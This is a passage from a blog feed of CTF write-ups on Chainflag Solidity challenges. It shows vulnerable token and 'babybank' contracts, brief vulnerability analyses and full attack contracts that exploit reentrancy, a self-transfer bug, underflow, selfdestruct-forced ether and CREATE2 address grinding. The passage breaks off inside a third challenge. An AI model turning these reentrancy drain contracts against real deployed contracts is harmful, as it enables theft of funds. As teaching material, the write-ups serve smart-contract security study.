class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2019-09-07</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2019-05-31</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract owned &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor () </span><br><span class="line">        public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public </span><br><span class="line">        onlyOwner &#123;</span><br><span class="line">        owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract challenge is owned&#123;</span><br><span class="line">    string public name;</span><br><span class="line">    string public symbol;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping (address =&gt; uint256) public sellTimes;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;</span><br><span class="line">    mapping (address =&gt; bool) public winner;</span><br><span class="line"></span><br><span class="line">    event Transfer(address _from, address _to, uint256 _value);</span><br><span class="line">    event Burn(address _from, uint256 _value);</span><br><span class="line">    event Win(address _address,bool _win);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor (</span><br><span class="line">        uint256 initialSupply,</span><br><span class="line">        string tokenName,</span><br><span class="line">        string tokenSymbol</span><br><span class="line">    ) public &#123;</span><br><span class="line">        totalSupply = initialSupply * 10 ** uint256(decimals);  </span><br><span class="line">        balanceOf[msg.sender] = totalSupply;                </span><br><span class="line">        name = tokenName;                                   </span><br><span class="line">        symbol = tokenSymbol;                               </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">        require(_to != address(0x0));</span><br><span class="line">        require(_value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        uint256 oldFromBalance = balanceOf[_from];</span><br><span class="line">        uint256 oldToBalance = balanceOf[_to];</span><br><span class="line">        </span><br><span class="line">        uint256 newFromBalance =  balanceOf[_from] - _value;</span><br><span class="line">        uint256 newToBalance =  balanceOf[_to] + _value;</span><br><span class="line">        </span><br><span class="line">        require(oldFromBalance &gt;= _value);</span><br><span class="line">        require(newToBalance &gt; oldToBalance);</span><br><span class="line">        </span><br><span class="line">        balanceOf[_from] = newFromBalance;</span><br><span class="line">        balanceOf[_to] = newToBalance;</span><br><span class="line">        </span><br><span class="line">        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));</span><br><span class="line">        emit Transfer(_from, _to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        _transfer(msg.sender, _to, _value); </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        require(_value &lt;= allowance[_from][msg.sender]);    </span><br><span class="line">        allowance[_from][msg.sender] -= _value;</span><br><span class="line">        _transfer(_from, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        allowance[msg.sender][_spender] = _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function burn(uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _value);</span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line">        totalSupply -= _value;          </span><br><span class="line">        emit Burn(msg.sender, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address _address) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balanceOf[_address];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy() payable public returns (bool success)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]==0);</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        _transfer(address(this), msg.sender, 1);</span><br><span class="line">        sellTimes[msg.sender] = 1;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function sell(uint256 _amount) public returns (bool success)&#123;</span><br><span class="line">        require(_amount &gt;= 100);</span><br><span class="line">        require(sellTimes[msg.sender] &gt; 0);</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        msg.sender.call.value(_amount)();</span><br><span class="line">        _transfer(msg.sender, address(this), _amount);</span><br><span class="line">        sellTimes[msg.sender] -= 1;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function winnerSubmit() public returns (bool success)&#123;</span><br><span class="line">        require(winner[msg.sender] == false);</span><br><span class="line">        require(sellTimes[msg.sender] &gt; 100);</span><br><span class="line">        winner[msg.sender] = true;</span><br><span class="line">        emit Win(msg.sender,true);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill(address _address) public onlyOwner &#123;</span><br><span class="line">        selfdestruct(_address);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function eth_balance() public view returns (uint256 ethBalance)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><ul><li><code>_transfer()</code>: logical vulnerability, if <code>_from</code> and <code>_to</code> are the same, the <code>_from</code>(or the <code>_to</code>) will get two times money.</li><li><code>sell()</code>: Reentrant, underflow, compulsory transfer of funds</li></ul><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">interface IH4ck &#123;</span><br><span class="line">    function buy() payable external;</span><br><span class="line">    function winnerSubmit() external;</span><br><span class="line">    function sell(uint256) external;</span><br><span class="line">    function transfer(address,uint256) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attck&#123;</span><br><span class="line">    IH4ck public h4ck;</span><br><span class="line">    bool public isSell;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr)public&#123;</span><br><span class="line">        h4ck = IH4ck(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function steo01_getFirstMoney()public payable&#123;</span><br><span class="line">        // get the first balanceOf to play the game</span><br><span class="line">        h4ck.buy&#123;value: 1&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step02_TransferTogetMoreMoney()public&#123;</span><br><span class="line">        // 2**8 = 256 &gt; 100</span><br><span class="line">        // 1 2 4 8 16 32 64 128 256</span><br><span class="line">        // 256 &gt; 200, so we can sell for two times: reentrant</span><br><span class="line">        uint256 moneyIteration = 1;</span><br><span class="line">        for(uint i = 0; i &lt; 8; i++)&#123;</span><br><span class="line">            h4ck.transfer(address(this),moneyIteration);</span><br><span class="line">            moneyIteration *= 2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step03_reentrant()public&#123;</span><br><span class="line">        // reentrant</span><br><span class="line">        h4ck.sell(100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step04_complete()public&#123;</span><br><span class="line">        h4ck.winnerSubmit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        if(!isSell)&#123;</span><br><span class="line">            isSell = true;</span><br><span class="line">            h4ck.sell(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // can&#x27;t not contains a reveive()</span><br><span class="line">    // bacause the contract will not enter fallback() but receive() when receives money.</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract sendMoney&#123;</span><br><span class="line">    // sell(100) ==&gt; at least call die() with 200 wei, I choose 1000 Wei</span><br><span class="line">    function die(address payable _addr) public payable&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">        // send so money to pass the &#x27;require(address(this).balance &gt;= _amount)&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.reentrancy @babybank</title>
      <link href="/2023/07/13/02.ChainflagCTF/16.reentrancy%20@babybank/"/>
      <url>/2023/07/13/02.ChainflagCTF/16.reentrancy%20@babybank/</url>
      
        <content type="html"><![CDATA[<h1 id="reentrancy-babybank"><a href="#reentrancy-babybank" class="headerlink" title="reentrancy @babybank"></a>reentrancy @babybank</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    </span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><ul><li>challenge 1：CREATE2</li><li>challenge 2：the secret is not initialized, it is 0.</li><li>challenge 3：Reentrant, underflow, compulsory transfer of funds</li></ul><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">interface IBabybank &#123;</span><br><span class="line">    function profit() external;</span><br><span class="line">    function guess(uint256) external;</span><br><span class="line">    function withdraw(uint256) external;</span><br><span class="line">    function payforflag(string memory ,string memory ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    IBabybank public bank;</span><br><span class="line">    bool public isWithdraw;</span><br><span class="line">    function step01_setBank(address _addr)public&#123;</span><br><span class="line">        bank = IBabybank(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step02_profit()public&#123;</span><br><span class="line">        bank.profit();</span><br><span class="line">    &#125;</span><br><span class="line">    function step03_guess()public&#123;</span><br><span class="line">        bank.guess(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function step04_withdraw()public&#123;</span><br><span class="line">        bank.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step05_complete()public&#123;</span><br><span class="line">        bank.payforflag(&quot;successfully&quot;,&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        if(!isWithdraw)&#123;</span><br><span class="line">            isWithdraw = true;</span><br><span class="line">            bank.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract sendMoney &#123;</span><br><span class="line">    function die(address payable _addr) public payable &#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployer&#123;</span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561001057600080fd5b50610990806100206000396000f3fe6080604052600436106100745760003560e01c80636c0c816c1161004e5780636c0c816c1461020657806376cdb03b1461021d578063dbae172c14610248578063e64174ad1461027357610075565b8063090d23b9146101af578063522e1177146101d85780635619253b146101ef57610075565b5b6100b36040518060400160405280600f81526020017f6265666f72652066616c6c6261636b000000000000000000000000000000000081525061028a565b600060149054906101000a900460ff166101ad576101056040518060400160405280600881526020017f66616c6c6261636b00000000000000000000000000000000000000000000000081525061028a565b6001600060146101000a81548160ff02191690831515021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60026040518263ffffffff1660e01b815260040161017a9190610636565b600060405180830381600087803b15801561019457600080fd5b505af11580156101a8573d6000803e3d6000fd5b505050505b005b3480156101bb57600080fd5b506101d660048036038101906101d191906106b4565b610323565b005b3480156101e457600080fd5b506101ed610366565b005b3480156101fb57600080fd5b506102046103f1565b005b34801561021257600080fd5b5061021b61047f565b005b34801561022957600080fd5b50610232610501565b60405161023f9190610736565b60405180910390f35b34801561025457600080fd5b5061025d610525565b60405161026a919061076c565b60405180910390f35b34801561027f57600080fd5b50610288610538565b005b6103208160405160240161029e9190610817565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506105c6565b50565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638c0320de6040518163ffffffff1660e01b81526004016103bd906108d1565b600060405180830381600087803b1580156103d757600080fd5b505af11580156103eb573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639189fec160006040518263ffffffff1660e01b815260040161044b919061093f565b600060405180830381600087803b15801561046557600080fd5b505af1158015610479573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166366d16cc36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104e757600080fd5b505af11580156104fb573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060149054906101000a900460ff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60026040518263ffffffff1660e01b81526004016105929190610636565b600060405180830381600087803b1580156105ac57600080fd5b505af11580156105c0573d6000803e3d6000fd5b50505050565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b6000819050919050565b6000819050919050565b6000819050919050565b600061062061061b610616846105e7565b6105fb565b6105f1565b9050919050565b61063081610605565b82525050565b600060208201905061064b6000830184610627565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061068182610656565b9050919050565b61069181610676565b811461069c57600080fd5b50565b6000813590506106ae81610688565b92915050565b6000602082840312156106ca576106c9610651565b5b60006106d88482850161069f565b91505092915050565b60006106fc6106f76106f284610656565b6105fb565b610656565b9050919050565b600061070e826106e1565b9050919050565b600061072082610703565b9050919050565b61073081610715565b82525050565b600060208201905061074b6000830184610727565b92915050565b60008115159050919050565b61076681610751565b82525050565b6000602082019050610781600083018461075d565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156107c15780820151818401526020810190506107a6565b60008484015250505050565b6000601f19601f8301169050919050565b60006107e982610787565b6107f38185610792565b93506108038185602086016107a3565b61080c816107cd565b840191505092915050565b6000602082019050818103600083015261083181846107de565b905092915050565b7f636861696e666c61670000000000000000000000000000000000000000000000600082015250565b600061086f600983610792565b915061087a82610839565b602082019050919050565b7f6261627962616e6b000000000000000000000000000000000000000000000000600082015250565b60006108bb600883610792565b91506108c682610885565b602082019050919050565b600060408201905081810360008301526108ea81610862565b905081810360208301526108fd816108ae565b9050919050565b6000819050919050565b600061092961092461091f84610904565b6105fb565b6105f1565b9050919050565b6109398161090e565b82525050565b60006020820190506109546000830184610930565b9291505056fea2646970667358221220e74d36bd68266726f240a7741fb3c927d40ee81e4bc6f8fba5f0bbb9ef54c35764736f6c63430008100033&quot;;</span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.storage @Happy_DOuble_Eleven</title>
      <link href="/2023/07/13/02.ChainflagCTF/15.storage%20@Happy_DOuble_Eleven%20-%20l%CC%A7a%CC%A8a%CC%A8u%CC%84/"/>
      <url>/2023/07/13/02.ChainflagCTF/15.storage%20@Happy_DOuble_Eleven%20-%20l%CC%A7a%CC%A8a%CC%A8u%CC%84/</url>
      
        <content type="html"><![CDATA[<h1 id="storage-Happy-DOuble-Eleven"><a href="#storage-Happy-DOuble-Eleven" class="headerlink" title="storage(Happy_DOuble_Eleven)"></a>storage(Happy_DOuble_Eleven)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">interface Tmall &#123;</span><br><span class="line">    function Chop_hand(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Happy_DOuble_Eleven &#123;</span><br><span class="line">    </span><br><span class="line">    address public owner; //0</span><br><span class="line">    bool public have_money; //0</span><br><span class="line">    bytes32[] public codex; //1</span><br><span class="line"></span><br><span class="line">    bool public have_chopped; //2</span><br><span class="line">    uint public hand; //3</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint) public balanceOf; //4</span><br><span class="line">    mapping (address =&gt; uint) public mycart; 